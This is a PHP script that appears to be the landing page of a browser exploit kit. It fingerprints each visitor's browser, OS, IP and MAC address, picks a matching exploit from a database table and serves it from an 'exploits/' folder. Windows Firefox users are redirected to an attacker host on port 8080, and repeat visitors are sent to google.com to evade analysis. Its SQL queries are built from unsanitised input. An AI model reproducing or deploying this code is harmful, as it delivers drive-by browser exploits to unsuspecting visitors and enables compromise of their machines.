<?php
require_once( "databasedetails.php" );
require_once( "getdetails.php" );
require_once( "databaseconnection.php" );


$ip = $_SERVER['REMOTE_ADDR'];
$connection=mysqli_connect($DBHOST, $DBUSER, $DBPASS,$DBNAME);
$r = mysqli_query( $connection,"SELECT 1 FROM stats WHERE ip=INET_ATON('{$ip}') AND time>UNIX_TIMESTAMP()-{$BANTIME}" );
$browser=new Browser();
    $IP       = $browser->localIP();
    if(!isset($IP)){
        $IP = $browser->getIP();
    }
    $browver  = $browser->getVersion();
    $browtype = $browser->getBrowser();
    $osver    = $browser->getPlatform();
    $mac    = $browser->GetClientMac();
//$todaydate = date("y-m-d");
$todaydate= '20'.date("y-m-d");

if(mysqli_num_rows($r)!=0){
$visitno = mysqli_query($connection,"SELECT source FROM stats WHERE client='{$ip}'");
        $visitrow=[];
        while($rowforhit = mysqli_fetch_row($visitno)){
            $visitrow[]=$rowforhit;
        }
        $visitval = $visitrow[0][0];
    }
if ( !mysqli_connect( $DBHOST, $DBUSER, $DBPASS ) )
                    {
        
                        echo "Installation was not completed! Unable to connect to MySQL host. Check MySQL settings and try again.";
                        exit();
                    }
                if ( !mysqli_select_db( $connection, $DBNAME ) )
                    {
                        echo "Installation was not completed! The software was able to connect to MySQL host but created MySQL database was not found. Check database name and try again.";
                        exit();
                    }
                $install = mysqli_query($connection,"CREATE TABLE IF NOT EXISTS analytics (
				id int(11) NOT NULL auto_increment,
                today_date varchar(20) NOT NULL,
                no_of_visitors int(11) NOT NULL,
				no_of_hits varchar(10) NOT NULL,
                PRIMARY KEY  (id)); ");
                if($error=mysqli_error($connection))
                    {
                        echo "Installation wasn't completed cuz of MySQL's error. MySQL error description:";
                            print $error;
                        exit();
                    }
                else
                    {
                        echo "";
                    
                    }

$check_ip = mysqli_query($connection,"SELECT client FROM stats WHERE  client='{$ip}'");
  if(mysqli_num_rows($check_ip)>=1)
  {

  }
  else
  {
    $rrr = mysqli_query($connection,"SELECT * FROM analytics WHERE today_date='{$todaydate}'");
    $rr = $rrr->num_rows;
    if($rr!=0 ){
    mysqli_query($connection,"UPDATE analytics SET no_of_visitors = no_of_visitors+1 WHERE today_date='{$todaydate}' ");
    
    }
    else{
    mysqli_query($connection,"INSERT INTO analytics (no_of_visitors,today_date,no_of_hits) VALUES ('1','{$todaydate}','0')");
  }
}

if(0 < mysqli_num_rows($r)) {
    //header("Location: "."http://www.google.com");

     
    if(1<$visitval){
            mysqli_query($connection,"UPDATE stats SET source = source+1 WHERE client='{$ip}' ");
            header("Location: "."http://www.google.com");
            exit();
        

    }

    if(1==$visitval){
        mysqli_query($connection,"UPDATE stats SET source = source+1 WHERE client='{$ip}' ");
        $hitno = mysqli_query($connection,"SELECT hit FROM stats WHERE client='{$ip}'");
        $hitrow=[];
        while($rowforhit = mysqli_fetch_row($hitno)){
            $hitrow[]=$rowforhit;
        }
        $hitval = $hitrow['0']['0'];
        
        if(strtolower($hitval) =="smbredirect.html"){
            readfile('exploits/error.html');
        }
        if(strtolower($hitval)=="chromehang.html"){
            readfile('exploits/google crash.html');
        }
        
        }
    }
    
else{
    mysqli_query( $connection,"INSERT INTO stats (ip,time,browver,browtype,osver,mac,client,hit,source) VALUES (INET_ATON('{$ip}'),UNIX_TIMESTAMP(),'{$browver}','{$browtype}','{$osver}','{$mac}','{$IP}','0','0')" );
    mysqli_query($connection,"UPDATE stats SET source = source+1 WHERE client='{$ip}' ");
    function selectexploit($osversion,$brow){
        global $browtype, $browver,$osver,$connection,$todaydate,$ip;
    if ($browtype==$brow) {
                if($osver==$osversion){
                    
                    $r = mysqli_query( $connection,"SELECT browserver,exploitname FROM exploitdb WHERE os='{$osver}' AND browser='{$browtype}'" );
                     $rnum=$r->num_rows;
                    $rows = [];
                    while( $row=mysqli_fetch_row($r) ){
                        $rows[] = $row;
                    }

                    $i='0';
                    while($i<$rnum){
                    if($rows[$i]['0']==$browver){
                        mysqli_query($connection,"UPDATE analytics SET no_of_hits = no_of_hits+1 WHERE today_date='{$todaydate}'");
                        readfile("exploits/".$rows[$i]['1']);
                        mysqli_query($connection,"UPDATE stats SET hit='{$rows[$i][1]}' WHERE client = '{$ip}'");
                        exit();
                    }
                    $i++;
                }
                if($i==$rnum){
header("Location: "."http://www.google.com");
exit();
                }
                    
                    }  

            }
}

    $a="x64";
header("Content-Type: text/html; charset=Windows-1251");
    switch ($a) {
        case "x64" :
            if (strtolower($browtype)=="chrome") 
                {
                if(strtolower($osver)=="windows"){   selectexploit($osver,$browtype);  }
                if(strtolower($osver)=="linux")  {   selectexploit($osver,$browtype);  }
                }

            if (strtolower($browtype)=="internet explorer") 
                {
                if(strtolower($osver)=="windows"){  selectexploit($osver,$browtype);   }
                if(strtolower($osver)=="linux")  {  selectexploit($osver,$browtype);   }
                }

            if (strtolower($browtype)=="firefox") 
                {
                if(strtolower($osver)=="windows"){

                    header("Location: "."http://192.168.43.113:8080/nullbyte");
                    exit();}
                
                if(strtolower($osver)=="linux"){selectexploit($osver,$browtype);}
            }
            
            break; 
        default:
        header("Location: "."http://www.google.com");
        exit();

	
    }

    exit();
}


?>